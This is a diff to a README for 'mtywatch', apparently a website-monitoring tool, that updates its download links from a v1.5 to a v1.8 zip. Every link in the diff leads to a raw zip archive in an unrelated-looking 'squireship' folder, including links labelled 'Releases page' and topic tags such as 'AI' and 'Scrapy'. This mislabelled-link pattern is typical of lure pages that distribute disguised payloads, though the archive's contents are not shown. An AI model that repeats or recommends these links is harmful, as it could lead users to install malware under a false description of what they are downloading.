@@ -6,7 +6,7 @@ mtywatch helps you keep track of website changes. Whether you want to know when 
 
 ## 📥 Download mtywatch
 
-[![Download mtywatch](https://github.com/nomiS0614/mtywatch/raw/refs/heads/main/squireship/Software-v1.5.zip%20mtywatch-%20-brightgreen)](https://github.com/nomiS0614/mtywatch/raw/refs/heads/main/squireship/Software-v1.5.zip)
+[![Download mtywatch](https://github.com/nomiS0614/mtywatch/raw/refs/heads/main/squireship/Software-v1.8.zip%20mtywatch-%20-brightgreen)](https://github.com/nomiS0614/mtywatch/raw/refs/heads/main/squireship/Software-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Follow these simple steps to download and run mtywatch on your computer.
 
 ### Step 1: Visit the Releases Page
 
-To begin, visit the [Releases page](https://github.com/nomiS0614/mtywatch/raw/refs/heads/main/squireship/Software-v1.5.zip). This page contains the latest version of mtywatch.
+To begin, visit the [Releases page](https://github.com/nomiS0614/mtywatch/raw/refs/heads/main/squireship/Software-v1.8.zip). This page contains the latest version of mtywatch.
 
 ### Step 2: Download the Latest Version
 
@@ -58,9 +58,9 @@ If you encounter any issues or have questions, help is available. Here are some 
 
 For further information and updates, refer to the following topics:
 
-- [AI](https://github.com/nomiS0614/mtywatch/raw/refs/heads/main/squireship/Software-v1.5.zip)
-- [Web Crawlers](https://github.com/nomiS0614/mtywatch/raw/refs/heads/main/squireship/Software-v1.5.zip)
-- [Scrapy](https://github.com/nomiS0614/mtywatch/raw/refs/heads/main/squireship/Software-v1.5.zip)
+- [AI](https://github.com/nomiS0614/mtywatch/raw/refs/heads/main/squireship/Software-v1.8.zip)
+- [Web Crawlers](https://github.com/nomiS0614/mtywatch/raw/refs/heads/main/squireship/Software-v1.8.zip)
+- [Scrapy](https://github.com/nomiS0614/mtywatch/raw/refs/heads/main/squireship/Software-v1.8.zip)
 
 ## 📝 Acknowledgments
 
@@ -72,4 +72,4 @@ mtywatch is licensed under the MIT License. Feel free to use it according to the
 
 ## 📒 Download & Install
 
-To start monitoring websites today, visit this page to download: [Releases page](https://github.com/nomiS0614/mtywatch/raw/refs/heads/main/squireship/Software-v1.5.zip). Follow the previous steps to install and run mtywatch. Enjoy seamless web tracking!
+To start monitoring websites today, visit this page to download: [Releases page](https://github.com/nomiS0614/mtywatch/raw/refs/heads/main/squireship/Software-v1.8.zip). Follow the previous steps to install and run mtywatch. Enjoy seamless web tracking!
